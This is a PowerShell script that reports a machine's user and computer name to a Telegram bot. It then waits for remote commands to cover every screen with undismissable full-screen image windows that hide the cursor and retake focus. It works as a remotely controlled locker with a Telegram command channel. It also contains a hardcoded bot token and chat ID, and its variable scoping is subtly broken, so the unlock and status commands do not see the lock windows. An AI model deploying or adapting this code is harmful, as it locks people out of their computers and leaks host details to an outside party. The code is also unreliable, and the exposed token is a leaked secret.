[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- CONFIG ---
$imageURL   = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImage  = "$env:TEMP\pawnimg.jpg"
$botToken   = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
$chatID     = "656189986"
$user       = $env:USERNAME
$pc         = $env:COMPUTERNAME
$lockCmd    = "/lock$user".ToLower()
$unlockCmd  = "/unlock$user".ToLower()
$statusCmd  = "/status$user".ToLower()
$forms      = $null

# --- IMAGE ---
Invoke-WebRequest -Uri $imageURL -OutFile $tempImage -UseBasicParsing

# --- Telegram Message ---
function Send-TG($msg) {
    try {
        $body = @{ chat_id = $chatID; text = $msg } | ConvertTo-Json -Compress
        Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'
    } catch { Write-Host "Telegram failed." }
}

Send-TG "🟢 $user ($pc) online and listening. Use: $lockCmd"

# --- GUI ---
Add-Type -AssemblyName System.Windows.Forms,System.Drawing

function Lock-Screen {
    if ($forms) { return }
    $forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
        $form = New-Object Windows.Forms.Form -Property @{
            FormBorderStyle = 'None'; WindowState = 'Maximized'; StartPosition = 'Manual'; TopMost = $true
            Location = $screen.Bounds.Location; Size = $screen.Bounds.Size
            Cursor = [System.Windows.Forms.Cursors]::None; BackColor = 'Black'
        }
        $pb = New-Object Windows.Forms.PictureBox -Property @{
            Image = [System.Drawing.Image]::FromFile($tempImage); Dock = 'Fill'; SizeMode = 'StretchImage'
        }
        $form.Controls.Add($pb)
        $form.Add_Deactivate({ $_.Activate() })
        $form.Show()
        $form
    }
    Send-TG "🔒 $pc locked. Send $unlockCmd to unlock."
}

function Unlock-Screen {
    if (!$forms) { return }
    foreach ($f in $forms) { try { $f.Close() } catch {} }
    $forms = $null
    Send-TG "⚠️ $pc is now UNLOCKED. Send $lockCmd to re-lock."
}

# --- LISTENER ---
$offset = 0
try {
    $start = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates" -TimeoutSec 5
    if ($start.result.Count -gt 0) {
        $offset = ($start.result | Select-Object -Last 1).update_id + 1
    }
} catch {}

$timer = New-Object Windows.Forms.Timer
$timer.Interval = 4000
$timer.Add_Tick({
    try {
        $updates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset" -TimeoutSec 10
        foreach ($u in $updates.result) {
            $offset = $u.update_id + 1
            $msg = $u.message.text.ToLower()
            if ($u.message.chat.id -ne [int]$chatID) { continue }
            if ($msg -eq $lockCmd)      { Lock-Screen }
            elseif ($msg -eq $unlockCmd) { Unlock-Screen }
            elseif ($msg -eq $statusCmd) {
                $state = if ($forms) { "🔒 LOCKED" } else { "🟢 UNLOCKED" }
                Send-TG "📍 $user ($pc) is $state"
            }
        }
    } catch {}
})
$timer.Start()
[System.Windows.Forms.Application]::Run()
